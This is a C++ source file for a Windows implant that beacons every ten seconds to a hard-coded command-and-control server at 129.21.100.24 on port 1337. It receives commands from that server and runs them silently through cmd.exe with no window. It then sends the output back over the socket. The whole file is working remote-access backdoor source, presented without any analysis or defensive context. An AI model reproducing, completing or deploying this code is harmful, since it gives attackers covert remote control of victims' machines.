#include <stdio.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

#define PORT "1337"
#define BUFLEN 1024

int beacon_to_c2(struct addrinfo* result, struct addrinfo* ptr, const char* sendbuf);
int send_message_to_c2(SOCKET ConnectSocket, const char* buffer);
int execute_command(const char* cmd, SOCKET ConnectSocket);

//int main(int argc, char const* argv[]) 
int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
{
	WSADATA wsaData;

	int iResult;

	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0)
	{
		printf("WSAStartup failed with code: %d\n", iResult);
		return 1;
	}

	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo("129.21.100.24", PORT, &hints, &result);
	if (iResult != 0)
	{
		printf("getaddrinfo failed with code %d\n", iResult);
		return 1;
	}

	ptr = result;

	const char sendbuf[] = "Hey, I'm the beacon! Pretty poggers if you ask me. Gimme command pls:\0";

	/*iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR)
	{
		printf("shutdown failed with code %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}*/
	int beaconResult;
	do {
		Sleep(10000);
		beaconResult = beacon_to_c2(result, ptr, sendbuf);
		if (beaconResult == 1)
			printf("WSAGetlastError: %d\n", WSAGetLastError());
	} while (beaconResult != 2);

	freeaddrinfo(result);
	WSACleanup();
	return 0;
}

int beacon_to_c2(struct addrinfo* result, struct addrinfo* ptr, const char* sendbuf) {
	SOCKET ConnectSocket = INVALID_SOCKET;

	ptr = result;

	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET)
	{
		printf("socket() failed with code %ld\n", WSAGetLastError());
		return 1;
	}

	int iResult;
	// Try to connect on the socket
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR)
	{
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
		printf("Can't connect to c2\n");
		return 1;
	}

	// Send initial buffer
	printf("Beaconing to c2...\n");
	fflush(stdout);
	//printf();
	iResult = send_message_to_c2(ConnectSocket, sendbuf);
	if (iResult != 0)
	{
		printf("Send failed with code %d\n", WSAGetLastError());
		return 1;
	}
	iResult = send_message_to_c2(ConnectSocket, "\xff");
	if (iResult != 0)
	{
		printf("Send failed with code %d\n", WSAGetLastError());
		return 1;
	}

	//printf("Bytes sent: %ld\n", iResult);
	//printf("Message sent: %s\n", sendbuf);
	//int bytesReceived = 0;
	do {
		char recvbuffer[BUFLEN];
		ZeroMemory(recvbuffer, BUFLEN);
		//printf("Size of buffer: %ld\n", BUFLEN);
		iResult = recv(ConnectSocket, recvbuffer, BUFLEN, 0);
		if (iResult > 0)
		{
			//printf("Bytes recieved: %d\n", iResult);
			printf("Command recieved: %s\n", recvbuffer);
			if (strcmp(recvbuffer, "quit") == 0)
				return 2;
			else
				return execute_command(recvbuffer, ConnectSocket);
			/*bytesReceived += iResult;
			if (bytesReceived == BUFLEN)
				printf("-------\nFinal String: %s\n", recvbuffer);*/
		}
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed with code %d\n", WSAGetLastError());
	} while (iResult > 0);

	// Close the socket
	closesocket(ConnectSocket);
	return 0;
}

int send_message_to_c2(SOCKET ConnectSocket, const char* buffer)
{
	int bufLen = (int)strlen(buffer) + 1;
	//printf("\n------\nsending: %s\nsize: %d\n------\n", buffer, bufLen);
	//int dataStart = 0;
	//while (dataStart < bufLen) {
	//	int dataSize = bufLen > 1024 ? min(bufLen - dataStart, 1024) : bufLen;
	//	char data[dataSize];
	//	memcpy(&data, &buffer[dataStart], );
	//buffer[bufLen] = '\0';
	int iResult;
	iResult = send(ConnectSocket, buffer, bufLen, 0);
	if (iResult == SOCKET_ERROR)
		return 1;
	//}
	return 0;
}

int execute_command(const char* cmd, SOCKET ConnectSocket)
{
	HANDLE g_hChildStd_IN_Wr;
	HANDLE g_hChildStd_IN_Rd;
	HANDLE g_hChildStd_OUT_Wr;
	HANDLE g_hChildStd_OUT_Rd;

	SECURITY_ATTRIBUTES saAttr;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
		return 1;
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
		return 1;
	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
		return 1;
	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
		return 1;

	size_t cmdBufLen = 32 + strlen(cmd);
	std::string fCmd = "C:\\Windows\\System32\\cmd.exe /c ";
	fCmd.append(cmd);
	LPSTR aCmd = const_cast<char*>(fCmd.c_str());
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL bSuccess = FALSE;

	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.hStdError = g_hChildStd_OUT_Wr;
	si.hStdOutput = g_hChildStd_OUT_Wr;
	si.hStdInput = g_hChildStd_IN_Rd;
	si.dwFlags |= STARTF_USESTDHANDLES;

	bSuccess = CreateProcessA(
		NULL,
		aCmd,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		(LPSTARTUPINFOA)&si,
		&pi
	);

	if (!bSuccess)
		return 2;
	else
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
		g_hChildStd_OUT_Wr = 0;
		g_hChildStd_IN_Rd = 0;
	}

	DWORD dwRead, dwWritten;
	CHAR chBuf[4096];
	BOOL cSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	ZeroMemory(&chBuf, sizeof(chBuf));
	printf("Output:\n");
	for (;;)
	{
		cSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
		if (!cSuccess || dwRead == 0)
		{
			printf("no more output...\n");
			break;
		}
		else
		{
			//printf("sending output...\n");
			if (send_message_to_c2(ConnectSocket, chBuf) != 0)
				printf("Error sending message, code %d\n", WSAGetLastError());
		}

		cSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
		if (!cSuccess)
		{
			printf("no more output...\n");
			break;
		}
		else
		{
			//printf("\nzeroing chBuf...\n");
			ZeroMemory(&chBuf, sizeof(chBuf));
		}
	}

	printf("child process is done\n");
	send_message_to_c2(ConnectSocket, "\xff");

	return 0;
}